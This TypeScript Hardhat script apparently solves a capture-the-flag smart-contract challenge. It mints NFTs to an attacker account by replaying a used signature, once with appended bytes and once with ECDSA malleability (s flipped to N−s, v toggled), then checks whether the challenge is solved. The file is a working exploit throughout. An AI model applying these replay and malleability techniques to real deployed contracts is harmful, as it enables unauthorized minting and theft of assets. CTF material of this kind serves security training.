import chalk from "chalk";
import { ethers } from "hardhat";
import { SetupATHTBBusiness23__factory, SetupATHTBBusiness23, AccessTokenHTBBusiness23__factory } from "../../typechain";
import { log, initialize } from "../utils";
import "crypto";

async function main() {
    let owner = (await ethers.getSigners())[0];
    let sig = await owner.signMessage("approve");
    let messageHash = ethers.hashMessage("approve");
    
    let [setupHTBBusiness23Contract, attacker] = await initialize<SetupATHTBBusiness23>(SetupATHTBBusiness23__factory, undefined, [owner.address, sig]);
    let accessToken = AccessTokenHTBBusiness23__factory.connect(await setupHTBBusiness23Contract.TARGET(), attacker);
    let signature = ethers.Signature.from(await accessToken.usedSignatures(0));
    
    // method 1
    let sig1 = signature.serialized+"12";
    let tx = await accessToken.safeMintWithSignature(sig1, attacker.address);
    await tx.wait();

    // method 2
    let new_s = "0x" + (ethers.N - ethers.toBigInt(signature.s)).toString(16);
    let new_v = (signature.v === 27) ? 28 : 27;
    let sig2 = await accessToken.constructSignature(new_v, signature.r, new_s);
    tx = await accessToken.safeMintWithSignature(sig2, attacker.address);
    await tx.wait();

    log(`Attacker NFT balance: ${chalk.yellow(await accessToken.balanceOf(attacker.address))}`);

    log(`Is solved: ${chalk.yellow(await setupHTBBusiness23Contract.isSolved(attacker.address))}`);
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});